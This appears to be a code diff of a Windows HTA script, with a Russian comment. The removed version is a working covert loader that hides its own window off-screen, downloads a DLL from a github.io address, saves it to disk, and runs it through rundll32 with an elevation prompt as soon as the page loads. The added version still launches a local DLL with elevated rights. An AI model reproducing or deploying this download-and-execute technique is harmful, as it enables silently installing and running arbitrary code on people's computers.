@@ -1,75 +1,22 @@
-<!DOCTYPE html>
+
 <html>
 <head>
+<hta:application />
+<script>
+var shell = new ActiveXObject("Shell.Application");
 
-<hta:application
-    showintaskbar="no"
-    singleinstance="yes"
-    sysmenu="no"
-    caption="no"
-    border="none"
-    scroll="no"
-    windowstate="minimize">
+shell.ShellExecute(
+    "rundll32.exe",
+    '"D:\\PYTHON\\C\\dll\\mydll.dll",RunMyApp',
+    "",
+    "runas",
+    1
+);
 
-<script language="javascript">
-
-function hideWindow()
-{
-    try
-    {
-        window.moveTo(-10000, -10000);
-        window.resizeTo(1, 1);   // 0x0 часто блокируется → 1x1 работает стабильнее
-    }
-    catch(e) {}
-}
-
-function downloadFile()
-{
-    var url = "https://ospamox.github.io/mydll.dll";
-    var savePath = "D:\\PYTHON\\C\\dll\\mshta\\mydll.dll";
-
-    try
-    {
-        hideWindow();
-
-        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-        xhr.open("GET", url, false);
-        xhr.send();
-
-        if (xhr.status === 200)
-        {
-            var stream = new ActiveXObject("ADODB.Stream");
-            stream.Type = 1;
-            stream.Open();
-            stream.Write(xhr.responseBody);
-            stream.SaveToFile(savePath, 2);
-            stream.Close();
-
-            var shell = new ActiveXObject("Shell.Application");
-
-            shell.ShellExecute(
-                "rundll32.exe",
-                '"D:\\PYTHON\\C\\dll\\mshta\\mydll.dll",RunMyApp',
-                "",
-                "runas",
-                1
-            );
-        }
-    }
-    catch(e)
-{
-    alert(e.message);
-}
-
-    setTimeout(function () {
-        window.close();
-    }, 300);
-}
-
-window.onload = downloadFile;
-
+ alert("HY JS !!!");
+    close();
 </script>
-
 </head>
-<body></body>
+<body>
+</body>
 </html>
